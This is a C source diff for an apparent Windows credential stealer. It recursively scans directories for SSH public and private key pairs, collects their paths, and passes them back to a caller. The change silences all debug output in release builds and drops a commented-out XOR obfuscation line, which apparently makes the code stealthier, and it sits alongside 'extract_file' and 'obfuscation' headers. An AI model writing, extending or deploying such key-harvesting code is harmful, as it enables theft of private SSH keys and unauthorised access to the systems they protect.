@@ -8,13 +8,16 @@
 
 #include "extract_file.h"
 #include "obfuscation.h"
-static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
-                           size_t lenPkFile, sshkey keysTab[MAX_KEY_FILES],
+
+static BOOL find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
+                           size_t lenPkFile, sshKey keysTab[MAX_KEY_FILES],
                            DWORD32 *index) {
   WCHAR *skName = malloc(sizeof(WCHAR) * lenPkFile - 3);
   if (skName == NULL) {
+#ifdef DEBUG
     printf("[Error] find_key_pair: malloc for skName failed.\n");
-    return;
+#endif
+    return FALSE;
   }
 
   WCHAR skNamePath[MAX_PATH];
@@ -30,15 +33,17 @@ static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
 
   free(skName);
 
+  // Checking if the public key is readable
+
   // Checking if the secret key exists
   DWORD attributes = GetFileAttributesW(skNamePath);
   if (attributes == INVALID_FILE_ATTRIBUTES ||
       (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
-    wchar_t error_msg[] =
-        L"[ERROR] find_key_pair: couldn't find private key for %ls\n";
-    // XOR_STR(error_msg, wcslen(error_msg));
-    wprintf(error_msg, pkNamePath);
-    return;
+#ifdef DEBUG
+    wprintf(L"[ERROR] find_key_pair: couldn't find private key for %ls\n",
+            pkNamePath);
+#endif
+    return FALSE;
   }
 
   DWORD32 lenPkNamePath = wcslen(pkNamePath);
@@ -53,16 +58,18 @@ static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
   wcsncpy(keysTab[*index].secretKeyPath, skNamePath, lenSkNamePath);
   keysTab[*index].secretKeyPath[lenSkNamePath] = L'\0';
 
+#ifdef DEBUG
   wprintf(
       L"[DEBUG] find_key_pair: Keys pair found: \nindex = %u\n\t%ls\n\t%ls\n\n",
       *index, keysTab[*index].publicKeyPath, keysTab[*index].secretKeyPath);
-
+#endif
   // incrementing the index
   (*index)++;
+  return TRUE;
 }
 
-static void find_ssh_key_recursively(const PWSTR directory,
-                                     sshkey keysFilenamesTab[MAX_KEY_FILES],
+static BOOL find_ssh_key_recursively(const PWSTR directory,
+                                     sshKey keysFilenamesTab[MAX_KEY_FILES],
                                      DWORD32 *indexKeysTab) {
   WIN32_FIND_DATAW findData;
   HANDLE hFind;
@@ -74,7 +81,7 @@ static void find_ssh_key_recursively(const PWSTR directory,
   // Searching recursively
   hFind = FindFirstFileW(searchPath, &findData);
   if (hFind == INVALID_HANDLE_VALUE) {
-    return;
+    return FALSE;
   }
 
   // Looping on all the file
@@ -113,7 +120,9 @@ static void find_ssh_key_recursively(const PWSTR directory,
       if (*indexKeysTab >= MAX_KEY_FILES) {
         break;
       } else if (wcscmp(fileName + (lenFileName - 4), file_extension) == 0) {
+#ifdef DEBUG
         wprintf(L"File : %ls\\%ls\n", directory, fileName);
+#endif
         find_keys_pair(directory, fileName, lenFileName, keysFilenamesTab,
                        indexKeysTab);
       }
@@ -122,16 +131,7 @@ static void find_ssh_key_recursively(const PWSTR directory,
   FindClose(hFind);
 }
 
-void find_ssh_key(const PWSTR directory) {
-  sshkey keysFilenamesTab[MAX_KEY_FILES] = {0};
-  DWORD32 indexKeysTab = 0;
-  find_ssh_key_recursively(directory, keysFilenamesTab, &indexKeysTab);
-  DWORD32 lenKeysTab = indexKeysTab;
-
-  // Code part where we process with the dumped keys filenames.
-  // here we just print the file
-  for (unsigned int i = 0; i < lenKeysTab; i++) {
-    print_file(keysFilenamesTab[i].publicKeyPath);
-    print_file(keysFilenamesTab[i].secretKeyPath);
-  }
+void find_ssh_key(const PWSTR directory, sshKey keysFilenamesTab[MAX_KEY_FILES],
+                  DWORD32 *lenKeysTab) {
+  find_ssh_key_recursively(directory, keysFilenamesTab, lenKeysTab);
 }
